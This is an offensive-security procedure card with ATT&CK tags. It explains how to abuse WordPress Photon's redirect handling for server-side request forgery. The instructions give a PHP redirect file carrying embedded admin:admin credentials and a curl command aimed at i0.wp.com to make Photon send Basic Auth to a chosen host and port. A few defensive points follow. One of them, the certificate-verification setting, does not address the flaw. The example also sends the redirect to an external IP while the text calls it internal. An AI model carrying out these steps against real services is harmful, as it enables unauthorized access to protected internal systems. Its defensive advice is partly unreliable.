---
id: proc-002
tags:
  - ssrf
  - bypass
  - redirect
  - authentication-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:55.056Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-Port-Restriction-Using-Redirect-with-Authentication

## Summary

This procedure bypasses Photon's port restrictions by using a controlled redirect endpoint that points to an internal service with embedded Basic Auth, causing cURL to follow the redirect and inject authentication headers.

## Description

Photon's cURL configuration (CURLOPT_REDIR_PROTOCOLS limited to HTTP/HTTPS) does not validate redirects for internal IPs, ports, or auth. By hosting a 302 redirect in new.php to http://admin:admin@internal-ip:port, the service follows it blindly. This enables SSRF with auth injection for internal attacks. Requires hosting a simple PHP redirect file.

## Requirements

1. Control over a server to host new.php (e.g., 159.203.190.123)
2. Internal service on port 666 accepting Basic Auth (admin:admin)
3. Access to http://i0.wp.com/

## Defense

Defensive measures and detection strategies:

- Disable automatic redirect following or validate redirect targets
- Set CURLOPT_SSL_VERIFYPEER to TRUE and block internal redirects
- Monitor cURL logs for unauthorized internal requests

## Objectives

1. Force Photon to request internal service via redirect
2. Inject authentication headers
3. Enable access to protected internal resources

## Instructions

### Step 1: Set Up Redirect Endpoint

**Context**: Create a PHP file on your controlled server to issue a 302 redirect with auth-embedded URL.

Create new.php:

```php
<?php header('Location: http://admin:admin@159.203.190.123:666'); ?>
```

Host at http://159.203.190.123/new.php.

### Step 2: Trigger Photon Request

**Context**: Request the redirect URL through Photon to initiate the SSRF.

Use curl or browser:

```bash
curl "http://i0.wp.com/159.203.190.123/new.php?resize=0,2"
```

> Photon follows the redirect, sending GET / HTTP/1.1 with Authorization: Basic YWRtaW46YWRtaW4= to the internal endpoint.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[ssrf]]
- [[redirect]]
